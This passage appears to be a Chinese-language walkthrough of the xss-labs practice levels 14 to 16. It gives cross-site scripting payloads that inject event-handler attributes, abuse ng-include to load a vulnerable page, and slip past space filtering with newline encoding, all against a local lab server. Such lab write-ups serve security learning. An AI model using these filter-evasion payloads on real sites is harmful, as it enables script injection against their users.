```
?keyword=1&t_link=1&t_history=1&t_sort=1
```

<img src="/assets/images/09/image-20260517202231057.png" alt="image-20260517202231057" style="zoom:50%;" />

```
?t_sort=1"%20type%20=%20text
```



![](/assets/images/09/image-20260517202709281.png)

在uri中注入payload，增加点击属性

```
?keyword=1&t_link=1&t_history=1&t_sort=1"%20type=text%20onclick=%27alert(123)%27
```

# 15

![image-20260517215214700](/assets/images/09/image-20260517215214700.png)

上面输入的内容出现在了ngInclude中

ng-include 指令用于包含外部的 HTML 文件。
包含的内容将作为指定元素的子节点。
ng-include 属性的值可以是一个表达式，返回一个文件名。
默认情况下，包含的文件需要包含在同一个域名下。

那么既然是可以直接引用html文件，那么我们直接引用一下第一关网址的html文件网址路径来试一下

```
http://192.168.179.130/xss-labs/level15.php?src=%27http://192.168.179.130/xss-labs/level1.php%27
```



![image-20260517215925222](/assets/images/09/image-20260517215925222.png)

发现加载出了第一关的文件，然后我们就在这个引用的关卡1中进行payload注入，这个题目就相当于文件包含，在一个存在文件引用的网页上引用同网段下其他有xss漏洞的网页，根据有漏洞的网页进行攻击

```
http://192.168.179.130/xss-labs/level15.php?src='http://192.168.179.130/xsslabs/level1.php?name=1<img src=1 onerror=alert(1)>'
```

# 16

![image-20260517221744074](/assets/images/09/image-20260517221744074.png)

把空格进行了实体编码

`<img scr="xxxx" type="xxx" >`

与

<img

src="xxx"

type="xxx">

效果相同，说明用空格分开和用回车键是等同的，那么我们就把空格换成回车

把`%20`换成`%0a`

```
<img%0asrc=1%0aonerror=alert(1)>
```
